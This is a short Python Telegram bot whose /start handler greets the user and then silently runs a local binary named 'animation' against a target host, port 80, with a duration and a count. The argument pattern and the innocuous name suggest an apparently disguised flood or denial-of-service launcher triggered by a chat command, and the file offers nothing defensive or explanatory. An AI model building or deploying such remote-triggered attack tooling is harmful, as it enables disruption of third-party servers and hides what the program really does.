import subprocess
import sys
import telebot
import os

BOT_TOKEN = os.getenv("BOT_TOKEN")
bot = telebot.TeleBot(BOT_TOKEN)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
ANIMATION = os.path.join(BASE_DIR, "animation")


@bot.message_handler(commands=["start"])
def start(message):
    bot.reply_to(message, "👋 Hello! Bot is running.")

    target = "example.com"
    port = "80"
    time = "10"

    full_command = f"./animation {target} {port} {time} 100"

    try:
        subprocess.run(
            full_command.split(),
            cwd=BASE_DIR,
            check=True
        )
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")


bot.infinity_polling()
